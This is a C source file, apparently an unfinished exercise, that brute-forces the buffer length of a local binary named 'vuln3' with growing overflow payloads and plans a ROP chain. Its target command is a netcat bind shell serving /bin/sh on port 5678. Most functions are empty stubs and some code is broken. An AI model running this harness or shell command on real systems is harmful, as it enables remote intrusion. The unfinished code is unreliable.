#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int writePayload(FILE* file, char* string);
int run(char *program, char *payloadFileName);

int bufferDiscovery(int mode, char *program);
int bruteForce(char *program);
int binarySearch();
int codeAnalysis();

FILE createROPchain(char *command);

#define BRUTE_FORCE 0
#define BINARY_SEARCH 1
#define ANALYSIS 2

#define COMMAND "execve(\"/tmp//nc\",\"-lnp\",\"5678\",\"-tte\",\"\bin//sh\", NULL)"
#define PROGRAM "vuln3"

int main(){
    char *program = "./" PROGRAM " < ";

    //STEP 1 - Buffer Discovery
    int bufferlength = bufferDiscovery(BRUTE_FORCE, program);
    //STEP 2 - Create ROP Chain
    FILE ROPchain = createROPchain(COMMAND);
    //STEP 3a - Verify success with known .data

    //STEP 3b - Verify success with random .data
}

int bufferDiscovery(int mode, char *program){
    if(mode == BRUTE_FORCE){
        //FULL BRUTE FORCE
        return bruteForce(program);
    }
    if(mode == BINARY_SEARCH){
        //Binary search brute force
        return binarySearch();
    }
    if(mode == ANALYSIS){
        //Code analysis
        return codeAnalysis();
    }
}

int bruteForce(char *program){
    int found = -1;
    char *fileLoc = "payload";
    FILE *test = fopen("payload", "w");
    char payload[132];
    for(int i = 0; found < 0 && i < 128; i++){
        for(int k = 0; k < i + 4; k++){
            payload[k] = 'A';
        }
        writePayload(test, payload);
        int output = run(program, fileLoc);
        fprintf(stdout, "Running program with buffer of %d, returned code %d", i, output);
        if(output){
            found = i;
            break;
        }
    } 
    return found;
}

int writePayload(FILE *file, char *string){

}

int run(char *program, char *payloadFileName){
    //Run program with payload
    char command[100];
    strcpy(command, program);
    strcat(command, payloadFileName);
    return system(command);
}

FILE createROPchain(char *command){
    //Find ROP gadgets
    //Write command as gadgets
    //Verify gadgets are present
    //Rewrite for missing gadgets
    //Chain gadgets
    //Write the payload
}
